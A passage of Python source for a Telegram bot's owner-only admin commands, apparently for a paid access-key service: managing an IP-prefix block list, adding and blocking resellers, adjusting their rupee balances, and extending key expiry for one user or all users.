        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑭𝒂𝒊𝒍𝒆𝒅 𝒕𝒐 𝒃𝒍𝒐𝒄𝒌 𝑰𝑷!</b>", reply_to=message)

@bot.message_handler(commands=["unblockip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /unblockip &lt;ip_prefix&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /unblockip 20.204", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    
    if remove_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒖𝒏𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝑷 𝒑𝒓𝒆𝒇𝒊𝒙 <code>{ip_prefix}*</code> 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅 𝒊𝒏 𝒃𝒍𝒐𝒄𝒌𝒆𝒅 𝒍𝒊𝒔𝒕!</b>", reply_to=message)

@bot.message_handler(commands=["blockedips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    blocked = get_all_blocked_ips()
    
    if not blocked:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝑰𝑷𝒔 𝒂𝒓𝒆 𝒄𝒖𝒓𝒓𝒆𝒏𝒕𝒍𝒚 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!", reply_to=message)
        return
    
    response = f"{HTML_EMOJI.BAN} <b>𝑩𝑳𝑶𝑪𝑲𝑬𝑫 𝑰𝑷𝑺 𝑳𝑰𝑺𝑻</b>\n\n"
    for i, ip_data in enumerate(blocked, 1):
        response += f"{i}. <code>{ip_data['ip']}*</code>\n"
    
    response += f"\n{HTML_EMOJI.STATS} 𝑻𝒐𝒕𝒂𝒍 𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝑷𝒓𝒆𝒇𝒊𝒙𝒆𝒔: {len(blocked)}"
    
    safe_send_message(message.chat.id, response, reply_to=message)
    
# ============ ADD RESELLER COMMAND ============

@bot.message_handler(commands=["add_reseller", "addreseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /add_reseller &lt;id or @username&gt;", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b> 𝑨𝒔𝒌 𝒕𝒉𝒆𝒎 𝒕𝒐 𝒖𝒔𝒆 /id 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒇𝒊𝒓𝒔𝒕.", reply_to=message)
        return
    
    existing = resellers_collection.find_one({'user_id': reseller_id})
    if existing:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒖𝒔𝒆𝒓 𝒊𝒔 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒂 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓!</b>", reply_to=message)
        return
    
    reseller_doc = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }
    
    resellers_collection.insert_one(reseller_doc)
    
    try:
        if bot:
            bot.send_message(reseller_id, f"{HTML_EMOJI.PARTY} <b>𝑪𝒐𝒏𝒈𝒓𝒂𝒕𝒖𝒍𝒂𝒕𝒊𝒐𝒏𝒔! 𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒘 𝒂 𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓!</b>\n\n{HTML_EMOJI.MONEY} 𝑼𝒔𝒆 /mysaldo 𝒕𝒐 𝒄𝒉𝒆𝒄𝒌 𝒃𝒂𝒍𝒂𝒏𝒄𝒆\n{HTML_EMOJI.KEY} 𝑼𝒔𝒆 /gen 𝒕𝒐 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒆 𝒌𝒆𝒚𝒔\n{HTML_EMOJI.CREDIT} 𝑼𝒔𝒆 /prices 𝒕𝒐 𝒔𝒆𝒆 𝒑𝒓𝒊𝒄𝒊𝒏𝒈", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝒂𝒅𝒅𝒆𝒅!</b>\n\n{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒓: {display}\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {reseller_id}\n{HTML_EMOJI.MONEY} 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: 0 𝑹𝒔", reply_to=message)

@bot.message_handler(commands=["remove_reseller", "removereseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /remove_reseller &lt;id or @username&gt;", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    result = resellers_collection.delete_one({'user_id': reseller_id})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.deleted_count > 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 {display} 𝒓𝒆𝒎𝒐𝒗𝒆𝒅!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)

@bot.message_handler(commands=["block_reseller", "blockreseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /block_reseller &lt;id or @username&gt;", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': True}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 {display} 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅 𝒐𝒓 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", reply_to=message)

@bot.message_handler(commands=["unblock_reseller", "unblockreseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /unblock_reseller &lt;id or @username&gt;", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': False}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 {display} 𝒖𝒏𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)

@bot.message_handler(commands=["all_resellers", "allresellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    resellers = list(resellers_collection.find())
    
    if not resellers:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓𝒔 𝒇𝒐𝒖𝒏𝒅!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.USERS} 𝑹𝑬𝑺𝑬𝑳𝑳𝑬𝑹 𝑳𝑰𝑺𝑻\n"
    response += "═══════════════════════════\n\n"
    
    active_resellers = [r for r in resellers if not r.get('blocked')]
    blocked_resellers = [r for r in resellers if r.get('blocked')]
    
    response += f"{HTML_EMOJI.CHECKMARK} 𝑨𝑪𝑻𝑰𝑽𝑬: {len(active_resellers)}\n"
    response += "───────────────────────────\n"
    
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. {HTML_EMOJI.PROFILE} <code>{r['user_id']}</code>\n"
        response += f"   {HTML_EMOJI.CREDIT} 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {r.get('balance', 0)} 𝑹𝒔\n"
        response += f"   {HTML_EMOJI.KEY} 𝑲𝒆𝒚𝒔: {r.get('total_keys_generated', 0)}\n\n"
    
    if blocked_resellers:
        response += f"{HTML_EMOJI.CROSS} 𝑩𝑳𝑶𝑪𝑲𝑬𝑫: {len(blocked_resellers)}\n"
        response += "───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. {HTML_EMOJI.PROFILE} <code>{r['user_id']}</code>\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ SALDO COMMANDS ============

@bot.message_handler(commands=["saldoadd"])
def saldo_add_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /saldoadd &lt;id or @username&gt; &lt;amount&gt;", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒂𝒎𝒐𝒖𝒏𝒕!</b>", reply_to=message)
        return
    
    if amount <= 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑨𝒎𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒑𝒐𝒔𝒊𝒕𝒊𝒗𝒆!</b>", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    new_balance = reseller.get('balance', 0) + amount
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    try:
        if bot:
            bot.send_message(reseller_id, f"{HTML_EMOJI.MONEY} <b>𝑩𝒂𝒍𝒂𝒏𝒄𝒆 𝑨𝒅𝒅𝒆𝒅!</b>\n\n{HTML_EMOJI.ARROW_RIGHT} 𝑨𝒅𝒅𝒆𝒅: {amount} 𝑹𝒔\n{HTML_EMOJI.CREDIT} 𝑵𝒆𝒘 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {new_balance} 𝑹𝒔", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒂𝒍𝒂𝒏𝒄𝒆 𝑨𝒅𝒅𝒆𝒅!</b>\n\n{HTML_EMOJI.PROFILE} 𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓: {display}\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {reseller_id}\n{HTML_EMOJI.ARROW_RIGHT} 𝑨𝒅𝒅𝒆𝒅: {amount} 𝑹𝒔\n{HTML_EMOJI.CREDIT} 𝑵𝒆𝒘 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {new_balance} 𝑹𝒔", reply_to=message)

@bot.message_handler(commands=["saldoremove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /saldoremove &lt;id or @username&gt; &lt;amount&gt;", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒂𝒎𝒐𝒖𝒏𝒕!</b>", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    new_balance = max(0, reseller.get('balance', 0) - amount)
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒂𝒍𝒂𝒏𝒄𝒆 𝑹𝒆𝒎𝒐𝒗𝒆𝒅!</b>\n\n{HTML_EMOJI.PROFILE} 𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓: {display}\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {reseller_id}\n{HTML_EMOJI.CROSS} 𝑹𝒆𝒎𝒐𝒗𝒆𝒅: {amount} 𝑹𝒔\n{HTML_EMOJI.CREDIT} 𝑵𝒆𝒘 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {new_balance} 𝑹𝒔", reply_to=message)

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /saldo &lt;id or @username&gt;", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.MONEY} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝑩𝒂𝒍𝒂𝒏𝒄𝒆</b>\n\n{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒓: {display}\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {reseller_id}\n{HTML_EMOJI.CREDIT} 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {reseller.get('balance', 0)} 𝑹𝒔\n{HTML_EMOJI.KEY} 𝑻𝒐𝒕𝒂𝒍 𝑲𝒆𝒚𝒔: {reseller.get('total_keys_generated', 0)}\n{HTML_EMOJI.STATS} 𝑺𝒕𝒂𝒕𝒖𝒔: {'🚫 𝑩𝒍𝒐𝒄𝒌𝒆𝒅' if reseller.get('blocked') else '✅ 𝑨𝒄𝒕𝒊𝒗𝒆'}", reply_to=message)

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    if not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓!</b>", reply_to=message)
        return
    
    if reseller.get('blocked'):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝒀𝒐𝒖𝒓 𝒑𝒂𝒏𝒆𝒍 𝒊𝒔 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", reply_to=message)
        return
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.MONEY} <b>𝒀𝒐𝒖𝒓 𝑩𝒂𝒍𝒂𝒏𝒄𝒆</b>\n\n{HTML_EMOJI.CREDIT} 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {reseller.get('balance', 0)} 𝑹𝒔\n{HTML_EMOJI.KEY} 𝑻𝒐𝒕𝒂𝒍 𝑲𝒆𝒚𝒔 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅: {reseller.get('total_keys_generated', 0)}\n\n{HTML_EMOJI.DOCUMENT} 𝑼𝒔𝒆 /prices 𝒕𝒐 𝒔𝒆𝒆 𝒌𝒆𝒚 𝒑𝒓𝒊𝒄𝒆𝒔\n{HTML_EMOJI.KEY} 𝑼𝒔𝒆 /gen 𝒕𝒐 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒆 𝒌𝒆𝒚𝒔", reply_to=message)
    
# ============ EXTEND / DOWN / KEY MANAGEMENT ============

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /extend &lt;id or @username&gt; &lt;time&gt;", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒅𝒖𝒓𝒂𝒕𝒊𝒐𝒏!</b>", reply_to=message)
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅 𝒊𝒏 𝒌𝒆𝒚 𝒅𝒂𝒕𝒂𝒃𝒂𝒔𝒆!</b>", reply_to=message)
        return
    
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'key_expiry': new_expiry}}
    )
    
    new_remaining = format_timedelta(new_expiry - datetime.now())
    
    try:
        if bot:
            bot.send_message(target_user_id, f"{HTML_EMOJI.PARTY} <b>𝑻𝒊𝒎𝒆 𝑬𝒙𝒕𝒆𝒏𝒅𝒆𝒅!</b>\n\n{HTML_EMOJI.TIMER} 𝑨𝒅𝒅𝒆𝒅: {duration_label}\n{HTML_EMOJI.TIMER} 𝑻𝒐𝒕𝒂𝒍 𝑻𝒊𝒎𝒆: {new_remaining}\n\n𝑬𝒏𝒋𝒐𝒚!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑻𝒊𝒎𝒆 𝑬𝒙𝒕𝒆𝒏𝒅𝒆𝒅!</b>\n\n{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒓: {display}\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {target_user_id}\n{HTML_EMOJI.TIMER} 𝑨𝒅𝒅𝒆𝒅: {duration_label}\n{HTML_EMOJI.TIMER} 𝑵𝒆𝒘 𝑻𝒊𝒎𝒆: {new_remaining}", reply_to=message)

@bot.message_handler(commands=["extendall"])
def extend_all_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /extendall &lt;time&gt;", reply_to=message)
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒅𝒖𝒓𝒂𝒕𝒊𝒐𝒏!</b>", reply_to=message)
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    
    if not all_users:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑵𝒐 𝒖𝒔𝒆𝒓𝒔 𝒘𝒊𝒕𝒉 𝒌𝒆𝒚𝒔 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    extended_count = 0
    notified_count = 0
    
    for user in all_users:
        uid = user['user_id']
        old_expiry = user.get('key_expiry')
        
        if old_expiry and old_expiry > datetime.now():
            new_expiry = old_expiry + duration
        else:
            new_expiry = datetime.now() + duration
            
        users_collection.update_one(
            {'user_id': uid},
            {'$set': {'key_expiry': new_expiry}}
        )
        extended_count += 1
        
        try:
            if bot:
                bot.send_message(uid, f"{HTML_EMOJI.PARTY} <b>𝑻𝒊𝒎𝒆 𝑬𝒙𝒕𝒆𝒏𝒅𝒆𝒅 𝒇𝒐𝒓 𝑨𝑳𝑳 𝑼𝒔𝒆𝒓𝒔!</b>\n\n{HTML_EMOJI.TIMER} 𝑨𝒅𝒅𝒆𝒅: {duration_label}\n\n𝑬𝒏𝒋𝒐𝒚!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
                notified_count += 1
        except:
            pass
            
